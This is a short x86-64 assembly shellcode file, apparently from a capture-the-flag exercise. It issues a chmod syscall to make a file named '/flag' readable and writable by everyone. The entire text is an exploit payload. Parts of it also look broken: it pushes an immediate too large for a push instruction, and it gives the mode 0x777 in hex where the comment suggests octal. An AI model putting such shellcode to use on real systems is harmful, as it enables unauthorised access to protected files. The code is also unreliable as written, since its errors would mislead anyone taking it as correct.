.intel_syntax noprefix
.global _start

_start:
    push 0x5A
    pop rax
    push 0x67616c662f; /flag rwx 777
    push rsp
    pop rdi
    push 0x777
    pop rsi
    syscall
